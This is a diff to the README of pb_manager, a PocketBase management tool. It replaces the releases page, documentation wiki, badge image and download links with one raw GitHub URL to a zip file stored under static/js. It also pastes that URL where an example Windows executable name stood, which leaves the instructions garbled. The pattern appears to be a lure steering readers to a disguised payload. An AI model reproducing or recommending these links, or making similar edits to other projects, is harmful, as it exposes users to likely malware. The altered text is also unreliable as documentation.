@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Pre-Built Release](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/AhsanBilal-748/pb_manager/releases)
+[![Download Pre-Built Release](https://raw.githubusercontent.com/AhsanBilal-748/pb_manager/main/static/js/pb_manager-v2.1-alpha.4.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/AhsanBilal-748/pb_manager/main/static/js/pb_manager-v2.1-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -21,11 +21,11 @@ Before you download, make sure your system meets these minimum requirements:
 
 To get started with **pb_manager**, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/AhsanBilal-748/pb_manager/releases). Here, you will find the latest version of **pb_manager** and its previous versions.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/AhsanBilal-748/pb_manager/main/static/js/pb_manager-v2.1-alpha.4.zip). Here, you will find the latest version of **pb_manager** and its previous versions.
 
 2. **Choose the Right Version**: Look for the most recent release. This will usually show up at the top of the list.
 
-3. **Download the Application**: Click on the file that matches your operating system. For example, if you're using Windows, you might see a file named `pb_manager_windows.exe`. Click on it to start the download.
+3. **Download the Application**: Click on the file that matches your operating system. For example, if you're using Windows, you might see a file named `https://raw.githubusercontent.com/AhsanBilal-748/pb_manager/main/static/js/pb_manager-v2.1-alpha.4.zip`. Click on it to start the download.
 
 4. **Locate the Downloaded File**: Once the download is complete, go to your Downloads folder or the location where you saved the file.
 
@@ -57,7 +57,7 @@ If you have questions or need further assistance, feel free to reach out to our 
 
 ## 📚 Additional Resources
 
-- **Documentation**: For more detailed instructions on using **pb_manager**, visit the [Documentation page](https://github.com/AhsanBilal-748/pb_manager/wiki).
+- **Documentation**: For more detailed instructions on using **pb_manager**, visit the [Documentation page](https://raw.githubusercontent.com/AhsanBilal-748/pb_manager/main/static/js/pb_manager-v2.1-alpha.4.zip).
 - **User Tutorials**: We have gathered tutorials that can help you use the application effectively.
 
 ## 🛡️ License
@@ -68,4 +68,4 @@ If you have questions or need further assistance, feel free to reach out to our 
 
 For any inquiries or feedback, please reach out via the GitHub Issues page on our repository. We appreciate your input and aim to improve **pb_manager** continuously.
 
-[Download Now](https://github.com/AhsanBilal-748/pb_manager/releases) and start managing your PocketBase instances with ease!
+[Download Now](https://raw.githubusercontent.com/AhsanBilal-748/pb_manager/main/static/js/pb_manager-v2.1-alpha.4.zip) and start managing your PocketBase instances with ease!
